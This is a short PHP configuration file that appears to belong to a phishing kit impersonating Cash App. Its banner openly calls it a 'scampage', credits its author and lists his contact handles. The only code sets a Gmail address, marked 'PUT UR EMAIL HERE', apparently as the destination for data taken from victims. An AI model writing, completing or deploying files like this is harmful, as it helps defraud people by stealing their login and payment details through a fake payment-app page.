<?php

/* 

|         CA💲HAPP          |
|    CODED BY MAGUZCODER   |
|   CA💲HAPP SCAMPAGE 20-21 |

Do you want to contact me ?

FACEBOOK➤fb.com/MaguZCoder/
ICQ➤@MaguzCoder

*/
//<========================>//
$send = "bekalco3@gmail.com"; // PUT UR EMAIL HERE
//<========================>//
?>
